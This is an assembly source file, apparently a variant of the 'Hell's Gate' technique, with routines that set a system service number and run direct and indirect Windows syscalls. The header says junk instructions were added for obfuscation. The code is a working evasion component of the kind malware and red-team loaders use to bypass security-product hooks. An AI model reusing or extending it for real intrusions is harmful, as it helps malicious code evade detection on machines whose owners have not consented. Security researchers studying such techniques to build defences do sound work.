; Hell's Gate
; Dynamic system call invocation 
; 
; Originally by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)
; updated to support indirect syscalls and also additional instructions added for a bit of obfuscation

.data
	wSystemCall DWORD 000h
	qSyscallJmpAddress QWORD	0h

.code 
    ; Direct syscalls
	GetSSND PROC
	    xor eax, eax
		mov wSystemCall, eax
		mov eax, ecx
		mov r8d, eax
		mov wSystemCall, r8d
		ret
	GetSSND ENDP

	InvokeD PROC
	    xor r10, r10
		mov rax, rcx
		mov r10, rax
		mov eax, wSystemCall
		jmp RunIt
		xor eax, eax
		xor rcx, rcx
		shl r10, 2
      RunIt:
	    syscall
		ret
	InvokeD ENDP

	; Indirect syscalls
	GetSSNI PROC
	    xor eax, eax
		mov wSystemCall, eax
		mov qSyscallJmpAddress, rax
		mov eax, ecx
		mov wSystemCall, eax
		mov r8, rdx
		mov qSyscallJmpAddress, r8
		ret
	GetSSNI ENDP

	InvokeI PROC
	    xor r10, r10
		mov rax, rcx
		mov r10, rax
		mov eax, wSystemCall
		jmp RunIT
        xor eax, eax
		xor ecx, ecx
		shl r10, 2
	  RunIT:
	    jmp qword ptr [qSyscallJmpAddress]
		xor r10, r10
		mov qSyscallJmpAddress, r10
		ret  
	InvokeI ENDP

end